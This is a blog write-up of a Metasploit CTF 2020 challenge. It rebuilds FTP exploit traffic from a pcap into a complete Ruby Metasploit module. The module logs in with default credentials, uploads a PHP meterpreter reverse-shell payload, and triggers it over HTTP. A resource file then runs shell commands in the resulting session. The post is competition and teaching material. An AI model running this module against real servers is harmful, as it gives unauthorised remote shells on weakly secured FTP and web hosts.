---
layout: post
title: 'Metasploit CTF 2020'
date: '2020-12-07T00:00:00.000-00:00'
author: Keramas
tags: [ctf, metasploit, rapid7]
---

The second Metasploit CTF of 2020 held by Rapid 7 (I will still refer to the one held in January as the 2019 one though...) wrapped up today and my CTF team, Neutrino Cannon, managed to secure 1st place on the first day of the competition, finishing all 20 challenges. The Metasploit CTFs are always an event we look forward to as a team, and this year was once again an enjoyable and fun experience.

<center><img src = "/assets/images/metasploitctf2020/finalscore.png"></center>

One of the challenges I dedicated a lot of focus on was the "5 of Clubs" which involved dissecting and analyzing a pcap file that contained exploit traffic in order to reconstruct the exploit and turn it into a Metasploit module and resource file that would be processed remotely (meaning, not from Metasploit on our attacking machine.) 

I did not have a lot of previous experience building out Metasploit modules or resource files, nor can I consider myself great at Ruby at all--but I decided that this was something I could do with a bit of patience to piece everything together.

<center><img src = "/assets/images/metasploitctf2020/instructions.png"></center>

Downloading the pcap file and opening it up in Wireshark, as expected from the challenge text, there is a bunch of FTP traffic present.

<center><img src = "/assets/images/metasploitctf2020/pcap1.png"></center>

Examining the TCP stream, we can see the various FTP commands being executed, and it seems that we will be able to transfer a PHP file via a combination of placing the FTP server into passive mode, and then using the STOR command to write data into a file.

<center><img src = "/assets/images/metasploitctf2020/tcpstream1.png"></center>

Additionally, it can be seen that the first attempt to write a file failed due to permissions, and it will be necessary to switch into the "/files" directory. Looking further into the pcap file there is another TCP stream for HTTP traffic which is requesting the uploaded file and displaying the result of the PHP code within the file.

<center><img src = "/assets/images/metasploitctf2020/tcpstream2.png"></center>

With all this information, we can piece everything together in order reconstruct the exploit in a Metasploit module.

We'll start with the standard heading of a Metasploit module and define that we want to include both a TCP and HttpClient since we will be interacting with both an FTP server and we also want to make a web request in order to execute our PHP payload. We also set the "Platform" and "Arch" to PHP as this is the kind of payload we will want to deliver.

```ruby
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
  
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'Metasploit CTF 2020 FTP PHP Reverse Shell Upload Exploit',
        'Description'    => %q{
            This module exploits a vsFTP server with default 
            credentials in order to upload a PHP reverse shell 
            into a web directory as seen in the Metasploit CTF 2020 5 of
            Club challenge. 
        },
        'Author'         =>
          [
            'Keramas', # Neutrino Cannon CTF/HTB Team
            'Metasploit CTF 2020 FTP PHP Reverse Shell Upload Exploit' # Metasploit module
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', 'None' ],
            [ 'EDB', 'None' ]
          ],
        'Privileged'     => false,
        'Platform'       => [ 'php' ],
        'Arch'           => ARCH_PHP,
        'Targets'        =>
          [
            [ 'Automatic', { } ]
          ],
        'DisclosureDate' => '2020-12-04',
        'DefaultTarget' => 0))
  
      register_options(
        [
          OptPort.new('RPORT', [true, 'HTTP port', 80]),
          OptPort.new('RPORT_FTP', [true, 'FTP port', 21]),
          OptString.new('TARGETURI', [true, 'Base path to the website', '/files/'])
        ])
    end
```

In the above code, we also register several options into our datastore which will be pulled in as variables in the rest of the module. For example, we know we our target URL where we write the PHP file for execution will be in the "/files" directory.

Now we can create an "exploit" function that will house all the activity to deploy our payload. To start, we initialize a connection to the FTP server with "Rex::Socket.create_tcp", and we will also define our PHP payload file name which will be a randomized alphanumeric value.

```ruby
    def exploit
      ftp_port = datastore['RPORT_FTP']
      payload_name = rand_text_alphanumeric(5+rand(3)) + '.php'
  
      sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)
  
      if sock.nil?
        fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
      else
        print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
      end
  
      res = sock.get_once(-1, 10)
      unless res && res.include?('220')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving FTP 220 OK banner")
      end
      
      print_status("#{rhost}:#{ftp_port} - Sending copy commands to FTP server")
```

With a successful connection, commands can then be executed over the socket, and the goal will be to replicate what was seen in the pcap. 

We'll login with the ftpuser using the password 'ftpuser', set the the current working directory to "/files", place the server into ASCII mode, and then set it to passive mode. 

```ruby
      
      # Login as ftpsuer:ftpuser
      sock.puts("USER ftpuser\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('331')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure submitting username")
      end
  
      sock.puts("PASS ftpuser\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('230')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failed to login.")
      end
  
      print_status("#{rhost}:#{ftp_port} - Successfully logged in.")
  
      # switch CWD to /files for upload
  
      sock.puts("CWD files\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('250')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure changing directory to files")
      end
      
      # ascii mode
  
      sock.puts("TYPE a\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('200')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failed to switch to ASCII mode")
      end
  
      # Put into passive mode
  
      sock.puts("PASV\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('227')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure to enter PASV mode")
      end
```

Looking back to the tcp stream when the server was placed into passive mode, you'll notice an array of integers when the server responds to the PASV command.

<center><img src = "/assets/images/metasploitctf2020/pasvport.png"></center>

This array is the IP address of the server and the randomized ephemeral port that will open up and act as the FTP data port. However, the two final integers are not just combined together to form the port number. There is an equation that must be used to calculate the port from these two numbers:

```
dataport = 256 * p1 + p2
```

p1 and p2 would be the last two number, respectively, in the array shown in the image above. So with this in mind, we need to factor this into our module code so that we can dynamically read in the data port that we will need to send our PHP code to. We will do this with the following code.

```ruby
      port_strings = res.split(",")
      v1 = port_strings[4].to_i 
      v2 = port_strings[5][0..1].to_i 
      
      dataport = 256 * v1 + v2
      print_status("#{rhost}:#{ftp_port} - Data port is #{dataport}")
```

Since we need to send our PHP code to a new port that opened up, we'll need to open up a separate socket connection to the server off the port we just dynamically read in. Following this, we will make a request to the original socket to issue the STOR command with our payload file name, and finally we will send the payload data itself via the "filedata" variable to the server over the second socket connection to the data port.

```ruby
      filedata = payload.encoded
  
      print_status("#{rhost}:#{dataport} - Opening connection on FTP data port")
      sock2 = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => dataport)
  
      if sock2.nil?
          fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP DATA port")
        else
          print_status("#{rhost}:#{ftp_port} - Connected to FTP DATA port")
        end
      
      # STOR
      sock.puts("STOR #{payload_name}\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('150')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure establish STOR connection")
      end
  
      print_status("#{rhost}:#{ftp_port} - Received code 150. Good to proceed with upload")
  
      sock2.puts(filedata)
      sock2.close
```

Finally, with the file and its content placed into the "/files" directory, we can execute it by making a web request to it.

```ruby
      print_status("Executing PHP payload #{target_uri.path}#{payload_name}")
      res = send_request_cgi!(
        'uri' => normalize_uri(target_uri.path, payload_name),
        'method' => 'GET'
      )
```
Putting everything together, the following is the final module code:

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
  
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'Metasploit CTF 2020 FTP PHP Reverse Shell Upload Exploit',
        'Description'    => %q{
            This module exploits a vsFTP server with default 
            credentials in order to upload a PHP reverse shell 
            into a web directory as seen in the Metasploit CTF 2020 5 of
            Club challenge. 
        },
        'Author'         =>
          [
            'Keramas', # Neutrino Cannon CTF/HTB Team
            'Metasploit CTF 2020 FTP PHP Reverse Shell Upload Exploit' # Metasploit module
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', 'None' ],
            [ 'EDB', 'None' ]
          ],
        'Privileged'     => false,
        'Platform'       => [ 'php' ],
        'Arch'           => ARCH_PHP,
        'Targets'        =>
          [
            [ 'Automatic', { } ]
          ],
        'DisclosureDate' => '2020-12-04',
        'DefaultTarget' => 0))
  
      register_options(
        [
          OptPort.new('RPORT', [true, 'HTTP port', 80]),
          OptPort.new('RPORT_FTP', [true, 'FTP port', 21]),
          OptString.new('TARGETURI', [true, 'Base path to the website', '/files/'])
        ])
    end
  
    def exploit
      ftp_port = datastore['RPORT_FTP']
      payload_name = rand_text_alphanumeric(5+rand(3)) + '.php'
  
      sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)
  
      if sock.nil?
        fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
      else
        print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
      end
  
      res = sock.get_once(-1, 10)
      unless res && res.include?('220')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving FTP 220 OK banner")
      end
      
      print_status("#{rhost}:#{ftp_port} - Sending copy commands to FTP server")
  
      # Login to server with ftpuser:ftpuser
  
      sock.puts("USER ftpuser\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('331')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure submitting username")
      end
  
      sock.puts("PASS ftpuser\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('230')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failed to login.")
      end
  
      print_status("#{rhost}:#{ftp_port} - Successfully logged in.")
  
      # switch CWD to /files for upload
  
      sock.puts("CWD files\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('250')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure changing directory to files")
      end
      
      # ascii mode
  
      sock.puts("TYPE a\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('200')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failed to switch to ASCII mode")
      end
  
      # Put into passive mode
  
      sock.puts("PASV\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('227')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure to enter PASV mode")
      end
    
      port_strings = res.split(",")
      v1 = port_strings[4].to_i 
      v2 = port_strings[5][0..1].to_i 
      
      dataport = 256 * v1 + v2
      print_status("#{rhost}:#{ftp_port} - Data port is #{dataport}")
      
      filedata = payload.encoded
  
      print_status("#{rhost}:#{dataport} - Opening connection on FTP data port")
      sock2 = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => dataport)
  
      if sock2.nil?
          fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP DATA port")
        else
          print_status("#{rhost}:#{ftp_port} - Connected to FTP DATA port")
        end
  
      # STOR
      sock.puts("STOR #{payload_name}\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('150')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure establish STOR connection")
      end
  
      print_status("#{rhost}:#{ftp_port} - Received code 150. Good to proceed with upload")
  
      sock2.puts(filedata)
      sock2.close
  
      res = sock.get_once(-1, 10)
      unless res && res.include?('226')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Error sending file data")
      end
  
      # ascii mode
  
      sock.puts("TYPE a\r\n")
      res = sock.get_once(-1, 10)
      unless res && res.include?('200')
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failed to switch to ASCII mode")
      end
  
      sock.close
  
      print_status("Executing PHP payload #{target_uri.path}#{payload_name}")
      res = send_request_cgi!(
        'uri' => normalize_uri(target_uri.path, payload_name),
        'method' => 'GET'
      )
  
      unless res && res.code == 200
        fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure executing payload")

      end  
    end
  end
```

Our module is complete, but now we need to create a resource file that will handle all of the automation once we achieve a session. Since we will not get a call back to our attacking machine, we will have to add in all of the commands we want to issue into the resource file so that when we upload the module and the resource file everything we need is displayed in the log files that we can see.

We'll set the port we want to use, set the payload type as a "php/meterpreter/reverse_tcp" and we'll also include a Ruby function "list_exec" which will take care of any commands we want to execute in the returned session. 

For the flag, we just need the card image and its md5 hash, so we issue the following to get the hash and a blob of base64 that we can decode on our host to get the png file:
```
md5sum ../../5_of_clubs.png
base64 -w0 ../../5_of_clubs.png
```

The final resource file looks like this:

```
# The module is copied to `modules/exploits/`, so don't change this
use exploit/module

# Datastore initialization here

set payload php/meterpreter/reverse_tcp
set LPORT 4444

# Make sure everything is alright
show options

# this will execute the module and put any session in background
run -z

# Check to make sure session is established.
<ruby>

 def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("/bin/bash -c \'#{cmd}\'", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)

             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end

 commands = ["md5sum ../../5_of_clubs.png","base64 -w0 ../../5_of_clubs.png"]

 print_status('Waiting a bit to make sure the session is completely setup...')

 timeout = 10
  
 loop do
   break if (timeout == 0) || (framework.sessions.any? && framework.sessions.first[1].sys)
    sleep 1
    timeout -= 1
   end
  
  if framework.sessions.any? && framework.sessions.first[1].sys
    # Interact with the PHP meterpreter shell
    client = framework.sessions[1]
    list_exec(client,commands)
  end
</ruby>
```

Uploading both of these files to the challenge server, it will process everything, and once the msf_out log file is ready, we can see that everything was executed as we wanted. We first get our hash, which is the value needed to submit the flag.

<center><img src = "/assets/images/metasploitctf2020/uploaded.png"></center>

<center><img src = "/assets/images/metasploitctf2020/executed_payload.png"></center>

And we also get our base64 blob back.

<center><img src = "/assets/images/metasploitctf2020/b64flag.png"></center>

Copying this all our and decoding it, we get the 5 of Clubs card and successfully complete the challenge!

<center><img src = "/assets/images/metasploitctf2020/5ofclubs.png"></center>



